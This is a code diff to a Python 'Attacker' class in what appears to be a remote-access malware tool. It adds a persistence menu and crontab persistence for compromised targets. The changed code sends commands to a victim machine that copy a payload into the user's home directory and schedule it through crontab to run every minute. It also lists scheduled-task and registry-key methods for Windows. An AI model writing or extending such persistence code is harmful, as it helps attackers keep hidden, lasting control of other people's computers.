@@ -13,8 +13,8 @@ class Attacker:
     def persist(self, server, target_index):
         target = server.list_of_targets[target_index]
         print(f"\n[+] Setting up persistence for {target.fullname}...\n")
+        selected_method_id = 0
         if "Windows" in target.os:
-            selected_method_id = 0
             while selected_method_id not in ["1", "2", "3"]:
                 print("Available methods :")
                 print("    1. Scheduling a task for vbs execution every five minutes.")
@@ -27,9 +27,18 @@ class Attacker:
             elif selected_method_id == "2":
                 self.persist_registry_key(server, target)
             elif selected_method_id == "3":
-                print("Cancelling... \n")
+                print("Cancelling...\n")
         else:
-            self.persist_crontab(server, target)
+            while selected_method_id not in ["1", "2"]:
+                print("Available methods :")
+                print("    1. Using crontab.")
+                print("    2. Cancel.\n")
+                selected_method_id = input("Enter the number of the method you want to use : ")
+                print("")
+            if selected_method_id == "1":
+                self.persist_crontab(server, target)
+            elif selected_method_id == "2":
+                print("Cancelling...\n")
 
     def persist_scheduled_task(self, server, target):
         # TODO implement scheduled tasks persistence method
@@ -53,6 +62,8 @@ class Attacker:
         # TODO handle automation of payload name variable + name errors
         payload_name = input("Enter payload name : ")
         try:
+            persistence_command = f"cp {payload_name} /home/{target.user}/"
+            server.send_message(target.id, persistence_command)
             persistence_command = f"echo '*/1 * * * * python3 /home/{target.user}/{payload_name}' | crontab -"
             server.send_message(target.id, persistence_command)
             print("\n[+] Persistence achieved.\n")
